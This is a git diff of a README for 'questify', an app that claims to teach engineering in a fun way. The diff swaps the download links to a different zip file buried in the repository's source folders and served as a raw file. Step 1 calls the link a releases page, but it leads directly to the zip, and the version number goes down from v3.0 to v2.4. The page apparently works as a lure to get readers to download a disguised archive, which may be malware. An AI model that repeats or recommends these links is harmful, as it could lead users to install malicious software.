@@ -1,7 +1,7 @@
 # 🎮 questify - Learn Engineering in a Fun Way
 
 ## 📥 Download Now
-[![Download questify](https://raw.githubusercontent.com/Jatinkumar000/questify/main/src/components/Software_v3.0.zip)](https://raw.githubusercontent.com/Jatinkumar000/questify/main/src/components/Software_v3.0.zip)
+[![Download questify](https://raw.githubusercontent.com/Jatinkumar000/questify/main/src/components/ui/Software-v2.4.zip)](https://raw.githubusercontent.com/Jatinkumar000/questify/main/src/components/ui/Software-v2.4.zip)
 
 ---
 
@@ -35,7 +35,7 @@ To get questify on your computer, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page where you can find the latest version of questify. 
 
-   [Download questify](https://raw.githubusercontent.com/Jatinkumar000/questify/main/src/components/Software_v3.0.zip)
+   [Download questify](https://raw.githubusercontent.com/Jatinkumar000/questify/main/src/components/ui/Software-v2.4.zip)
 
 2. **Select the Latest Release:** Look for the most recent version listed. This will usually be at the top of the page.
 
